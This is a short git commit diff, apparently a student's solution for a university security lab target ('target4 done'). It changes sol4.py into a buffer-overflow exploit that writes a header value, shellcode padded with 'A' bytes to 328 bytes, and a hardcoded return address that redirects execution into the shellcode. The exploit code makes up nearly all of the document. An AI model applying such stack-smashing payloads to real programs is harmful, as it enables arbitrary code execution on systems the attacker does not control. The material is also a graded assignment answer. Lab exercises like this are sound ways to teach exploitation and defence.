4c3d0d24d1b8cbebad14c98833acdf78ca9f6a00
yijo2004 <yijo@umich.edu>
2024-04-02 22:47:59 +0000

    target4 done

--- sol4.py
+++ sol4.py
@@ -3,5 +3,6 @@
 import sys
 
 from shellcode import shellcode
-
-sys.stdout.buffer.write(shellcode)
+sys.stdout.buffer.write(b'\x41\x00\x00\x00\x00\x00\x00\x40')
+sys.stdout.buffer.write(shellcode + b'A'*(328-len(shellcode)))
+sys.stdout.buffer.write(0x7ffffff69480.to_bytes(8,'little'))
